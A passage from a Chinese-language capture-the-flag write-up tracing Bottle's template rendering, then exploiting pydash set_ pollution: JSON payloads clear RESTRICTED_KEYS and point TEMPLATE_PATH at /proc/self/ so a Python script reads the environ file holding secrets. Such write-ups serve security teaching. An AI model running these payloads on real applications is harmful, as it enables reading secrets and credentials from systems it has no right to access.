+</span></span></code></pre></td></tr></table></div></div><p>运行效果：</p><p><img src=/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408161743852.png width=207 height=52 srcset="/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408161743852_hu17233507210906483960.png 480w, /p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408161743852_hu10933263575384240746.png 1024w" loading=lazy alt=image-20250408161743852 class=gallery-image data-flex-grow=398 data-flex-basis=955px></p><p>根据源码中的提示，我们知道，flag在环境变量中，所以我们想读取flag可以通过读取<code>/proc/self/environ</code>文件来读取flag。那么我们的思路就清晰了，在<code>/render</code>路由中，调用了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>bottle</span><span class=o>.</span><span class=n>template</span><span class=p>(</span><span class=n>path</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们就可以通过修改渲染模板中的某个记录了模板路径的变量，来实现读取<code>environ</code>文件。那么我们现在追溯一下这个template方法，寻找一下符合条件的变量。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>template</span><span class=p>(</span><span class=o>*</span><span class=n>args</span><span class=p>,</span> <span class=o>**</span><span class=n>kwargs</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    Get a rendered template as a string iterator.
+</span></span></span><span class=line><span class=cl><span class=s2>    You can use a name, a filename or a template string as first parameter.
+</span></span></span><span class=line><span class=cl><span class=s2>    Template rendering arguments can be passed as dictionaries
+</span></span></span><span class=line><span class=cl><span class=s2>    or directly (as keyword arguments).
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>tpl</span> <span class=o>=</span> <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=k>if</span> <span class=n>args</span> <span class=k>else</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>dictarg</span> <span class=ow>in</span> <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>:]:</span>
+</span></span><span class=line><span class=cl>        <span class=n>kwargs</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>dictarg</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>adapter</span> <span class=o>=</span> <span class=n>kwargs</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;template_adapter&#39;</span><span class=p>,</span> <span class=n>SimpleTemplate</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>lookup</span> <span class=o>=</span> <span class=n>kwargs</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;template_lookup&#39;</span><span class=p>,</span> <span class=n>TEMPLATE_PATH</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>tplid</span> <span class=o>=</span> <span class=p>(</span><span class=nb>id</span><span class=p>(</span><span class=n>lookup</span><span class=p>),</span> <span class=n>tpl</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>tplid</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>TEMPLATES</span> <span class=ow>or</span> <span class=n>DEBUG</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>settings</span> <span class=o>=</span> <span class=n>kwargs</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;template_settings&#39;</span><span class=p>,</span> <span class=p>{})</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>tpl</span><span class=p>,</span> <span class=n>adapter</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=n>TEMPLATES</span><span class=p>[</span><span class=n>tplid</span><span class=p>]</span> <span class=o>=</span> <span class=n>tpl</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>settings</span><span class=p>:</span> <span class=n>TEMPLATES</span><span class=p>[</span><span class=n>tplid</span><span class=p>]</span><span class=o>.</span><span class=n>prepare</span><span class=p>(</span><span class=o>**</span><span class=n>settings</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=ow>in</span> <span class=n>tpl</span> <span class=ow>or</span> <span class=s2>&#34;{&#34;</span> <span class=ow>in</span> <span class=n>tpl</span> <span class=ow>or</span> <span class=s2>&#34;%&#34;</span> <span class=ow>in</span> <span class=n>tpl</span> <span class=ow>or</span> <span class=s1>&#39;$&#39;</span> <span class=ow>in</span> <span class=n>tpl</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>TEMPLATES</span><span class=p>[</span><span class=n>tplid</span><span class=p>]</span> <span class=o>=</span> <span class=n>adapter</span><span class=p>(</span><span class=n>source</span><span class=o>=</span><span class=n>tpl</span><span class=p>,</span> <span class=n>lookup</span><span class=o>=</span><span class=n>lookup</span><span class=p>,</span> <span class=o>**</span><span class=n>settings</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>TEMPLATES</span><span class=p>[</span><span class=n>tplid</span><span class=p>]</span> <span class=o>=</span> <span class=n>adapter</span><span class=p>(</span><span class=n>name</span><span class=o>=</span><span class=n>tpl</span><span class=p>,</span> <span class=n>lookup</span><span class=o>=</span><span class=n>lookup</span><span class=p>,</span> <span class=o>**</span><span class=n>settings</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>TEMPLATES</span><span class=p>[</span><span class=n>tplid</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>        <span class=n>abort</span><span class=p>(</span><span class=mi>500</span><span class=p>,</span> <span class=s1>&#39;Template (</span><span class=si>%s</span><span class=s1>) not found&#39;</span> <span class=o>%</span> <span class=n>tpl</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TEMPLATES</span><span class=p>[</span><span class=n>tplid</span><span class=p>]</span><span class=o>.</span><span class=n>render</span><span class=p>(</span><span class=n>kwargs</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们关注这一行代码。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>adapter</span> <span class=o>=</span> <span class=n>kwargs</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;template_adapter&#39;</span><span class=p>,</span> <span class=n>SimpleTemplate</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>lookup</span> <span class=o>=</span> <span class=n>kwargs</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;template_lookup&#39;</span><span class=p>,</span> <span class=n>TEMPLATE_PATH</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里的作用是获取模板的渲染引擎，可以看到默认获取的是<code>SimpleTemplate</code>，<code>lookup</code>也就是模板的搜索路径，也就是<code>TEMPLATE_PATH</code>这个变量，默认值为：<code>['./', './views/']</code>，所以这里会从lookup所指示的目录中获取对应的模板文件，然后交给<code>SimpleTemplate</code>去解析。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>elif</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=ow>in</span> <span class=n>tpl</span> <span class=ow>or</span> <span class=s2>&#34;{&#34;</span> <span class=ow>in</span> <span class=n>tpl</span> <span class=ow>or</span> <span class=s2>&#34;%&#34;</span> <span class=ow>in</span> <span class=n>tpl</span> <span class=ow>or</span> <span class=s1>&#39;$&#39;</span> <span class=ow>in</span> <span class=n>tpl</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>TEMPLATES</span><span class=p>[</span><span class=n>tplid</span><span class=p>]</span> <span class=o>=</span> <span class=n>adapter</span><span class=p>(</span><span class=n>source</span><span class=o>=</span><span class=n>tpl</span><span class=p>,</span> <span class=n>lookup</span><span class=o>=</span><span class=n>lookup</span><span class=p>,</span> <span class=o>**</span><span class=n>settings</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>	<span class=n>TEMPLATES</span><span class=p>[</span><span class=n>tplid</span><span class=p>]</span> <span class=o>=</span> <span class=n>adapter</span><span class=p>(</span><span class=n>name</span><span class=o>=</span><span class=n>tpl</span><span class=p>,</span> <span class=n>lookup</span><span class=o>=</span><span class=n>lookup</span><span class=p>,</span> <span class=o>**</span><span class=n>settings</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里是一个切换通过模板渲染还是字符串渲染的判断逻辑，跟进解析器。由于传入的模板路径而不是字符串，所以这里会通过lookup这个参数去寻找对应目录下的模板文件，读取后再交给解析器解析。</p><p><img src=/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408165124018.png width=1001 height=224 srcset="/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408165124018_hu1491457114011764909.png 480w, /p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408165124018_hu16648807154259831361.png 1024w" loading=lazy alt=image-20250408165124018 class=gallery-image data-flex-grow=446 data-flex-basis=1072px></p><p>其中<code>name</code>就是我们传入的<code>path</code>参数，假设我们传入的参数<code>path=test</code>。获取到lookup的路径后，进入<code>search</code>方法最后把<code>name</code>拼接到所有的路径中并尝试读取模板文件。</p><p><img src=/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408165310108.png width=950 height=221 srcset="/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408165310108_hu9948514286685415170.png 480w, /p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408165310108_hu971554389472850342.png 1024w" loading=lazy alt=image-20250408165310108 class=gallery-image data-flex-grow=429 data-flex-basis=1031px></p><p>当读取到文件内容后，就会交给prepare</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>class</span> <span class=nc>SimpleTemplate</span><span class=p>(</span><span class=n>BaseTemplate</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>prepare</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=n>escape_func</span><span class=o>=</span><span class=n>html_escape</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=n>noescape</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=n>syntax</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=o>**</span><span class=n>ka</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>cache</span> <span class=o>=</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>        <span class=n>enc</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>encoding</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_str</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>touni</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>enc</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_escape</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>:</span> <span class=n>escape_func</span><span class=p>(</span><span class=n>touni</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=n>enc</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>syntax</span> <span class=o>=</span> <span class=n>syntax</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>noescape</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>_str</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>_escape</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>_escape</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>_str</span>
+</span></span></code></pre></td></tr></table></div></div><p>这个方法的作用就是初始化模板的字符处理逻辑，支持 HTML 转义或直接输出原始 HTML，也就是解析这个传入的template变成html，然后回到template结尾。进入render方法。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>render</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=o>*</span><span class=n>args</span><span class=p>,</span> <span class=o>**</span><span class=n>kwargs</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34; Render the template using keyword arguments as local variables. &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>env</span> <span class=o>=</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>    <span class=n>stdout</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>dictarg</span> <span class=ow>in</span> <span class=n>args</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>env</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>dictarg</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>env</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>kwargs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=n>env</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>stdout</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>继续追溯execute方法。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>_stdout</span><span class=p>,</span> <span class=n>kwargs</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>env</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>defaults</span><span class=o>.</span><span class=n>copy</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>env</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>kwargs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>env</span><span class=o>.</span><span class=n>update</span><span class=p>({</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;_stdout&#39;</span><span class=p>:</span> <span class=n>_stdout</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;_printlist&#39;</span><span class=p>:</span> <span class=n>_stdout</span><span class=o>.</span><span class=n>extend</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;include&#39;</span><span class=p>:</span> <span class=n>functools</span><span class=o>.</span><span class=n>partial</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>_include</span><span class=p>,</span> <span class=n>env</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;rebase&#39;</span><span class=p>:</span> <span class=n>functools</span><span class=o>.</span><span class=n>partial</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>_rebase</span><span class=p>,</span> <span class=n>env</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;_rebase&#39;</span><span class=p>:</span> <span class=kc>None</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;_str&#39;</span><span class=p>:</span> <span class=bp>self</span><span class=o>.</span><span class=n>_str</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;_escape&#39;</span><span class=p>:</span> <span class=bp>self</span><span class=o>.</span><span class=n>_escape</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;get&#39;</span><span class=p>:</span> <span class=n>env</span><span class=o>.</span><span class=n>get</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;setdefault&#39;</span><span class=p>:</span> <span class=n>env</span><span class=o>.</span><span class=n>setdefault</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;defined&#39;</span><span class=p>:</span> <span class=n>env</span><span class=o>.</span><span class=fm>__contains__</span>
+</span></span><span class=line><span class=cl>    <span class=p>})</span>
+</span></span><span class=line><span class=cl>    <span class=n>exec</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>co</span><span class=p>,</span> <span class=n>env</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>env</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;_rebase&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>subtpl</span><span class=p>,</span> <span class=n>rargs</span> <span class=o>=</span> <span class=n>env</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;_rebase&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>rargs</span><span class=p>[</span><span class=s1>&#39;base&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>_stdout</span><span class=p>)</span>  <span class=c1>#copy stdout</span>
+</span></span><span class=line><span class=cl>        <span class=k>del</span> <span class=n>_stdout</span><span class=p>[:]</span>  <span class=c1># clear stdout</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>_include</span><span class=p>(</span><span class=n>env</span><span class=p>,</span> <span class=n>subtpl</span><span class=p>,</span> <span class=o>**</span><span class=n>rargs</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>env</span>
+</span></span></code></pre></td></tr></table></div></div><p>可以看到这里构建了<code>env</code>环境，然后在<code>exec</code>中调用了执行预编译的模板也就是<code>self.co</code>，如果这里调用了rebase方法，就会递归的去调用父模板。之后会读取<code>test</code>文件的内容，然后在<code>render</code>中返回解析的内容。</p><p><img src=/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408171306505.png width=431 height=170 srcset="/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408171306505_hu4862599846027833507.png 480w, /p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408171306505_hu15283594764194935095.png 1024w" loading=lazy alt=image-20250408171306505 class=gallery-image data-flex-grow=253 data-flex-basis=608px></p><p>到这里我们就分析完了整个利用链。整理一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>template</span><span class=p>:</span><span class=n>adapter</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>class</span><span class=p>:</span><span class=n>BaseTemplate</span><span class=p>:</span><span class=n>search</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>class</span><span class=p>:</span><span class=n>SimpleTemplate</span><span class=p>:</span><span class=n>prepare</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>render</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>exec</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>stdout</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=利用>利用</h3><p>那么利用的思路就很简单了，我们希望读取environ文件，只需要通过<code>set_</code>方法修改<code>TEMPLATE_PATH</code>即可结合黑名单，payload如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=c1>//POST传参
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span><span class=nt>&#34;path&#34;</span><span class=p>:</span><span class=s2>&#34;__globals__.bottle.TEMPLATE_PATH&#34;</span><span class=p>,</span><span class=nt>&#34;value&#34;</span><span class=p>:[</span><span class=s2>&#34;../../../../../proc/self/&#34;</span><span class=p>]}</span>
+</span></span><span class=line><span class=cl><span class=c1>//GET传参：
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>name=setval</span>
+</span></span></code></pre></td></tr></table></div></div><p>但是<code>pydash</code>不允许修改<code>__globasl__</code>的属性，声明在<code>helpers.py</code>文件中。</p><p><img src=/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408172553144.png width=653 height=74 srcset="/p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408172553144_hu10539094586415668556.png 480w, /p/pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/image-20250408172553144_hu1360515093434183045.png 1024w" loading=lazy alt=image-20250408172553144 class=gallery-image data-flex-grow=882 data-flex-basis=2117px></p><p>所以我们还要先污染一下<code>RESTRICTED_KEYS</code></p><p>payload如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=c1>//POST传参
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span><span class=nt>&#34;path&#34;</span><span class=p>:</span><span class=s2>&#34;helpers.RESTRICTED_KEYS&#34;</span><span class=p>,</span><span class=nt>&#34;value&#34;</span><span class=p>:</span><span class=s2>&#34;[]&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=c1>//GET传参
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>name=pydash</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们可以得到如下python脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span><span class=o>,</span><span class=nn>re</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload_1</span> <span class=o>=</span> <span class=s1>&#39;{&#34;path&#34;:&#34;helpers.RESTRICTED_KEYS&#34;,&#34;value&#34;:&#34;[]&#34;}&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>payload_2</span> <span class=o>=</span> <span class=s1>&#39;{&#34;path&#34;:&#34;__globals__.bottle.TEMPLATE_PATH&#34;,&#34;value&#34;:[&#34;../../../../../proc/self/&#34;]}&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;url:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/json&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/setValue?name=pydash&#34;</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>payload_1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/setValue?name=setval&#34;</span><span class=p>,</span><span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>payload_2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/render?path=environ&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span>
